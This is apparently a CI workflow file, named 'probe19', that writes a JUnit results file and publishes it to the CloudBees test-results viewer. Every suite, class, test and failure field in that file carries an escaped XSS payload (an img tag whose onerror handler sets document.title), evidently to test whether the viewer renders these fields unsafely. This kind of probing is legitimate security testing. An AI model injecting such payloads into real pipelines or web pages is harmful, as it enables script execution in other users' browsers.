apiVersion: automation.cloudbees.io/v1alpha1
kind: workflow
name: probe19

on:
  push:
    branches:
      - main

jobs:
  tests:
    steps:
      - name: make-junit
        uses: docker://alpine:3.20
        run: |
          mkdir -p /cloudbees/workspace/results
          cat > /cloudbees/workspace/results/junit.xml <<'XEOF'
          <?xml version="1.0" encoding="UTF-8"?>
          <testsuites>
            <testsuite name="XSSSUITE&lt;img src=x onerror=document.title='TR_SUITE'&gt;" tests="2" failures="1" errors="0" time="1">
              <testcase classname="XSSCLASS&lt;img src=x onerror=document.title='TR_CLASS'&gt;" name="XSSNAME&lt;img src=x onerror=document.title='TR_NAME'&gt;" time="1">
                <failure message="XSSMSG&lt;img src=x onerror=document.title='TR_MSG'&gt;">XSSBODY&lt;img src=x onerror=document.title='TR_BODY'&gt;</failure>
              </testcase>
              <testcase classname="ok.class" name="ok-test" time="1"/>
            </testsuite>
          </testsuites>
          XEOF
          sed -i 's/^          //' /cloudbees/workspace/results/junit.xml
          cat /cloudbees/workspace/results/junit.xml
      - name: publish
        uses: cloudbees-io/publish-test-results@v2
        with:
          test-type: junit
          results-path: results/junit.xml
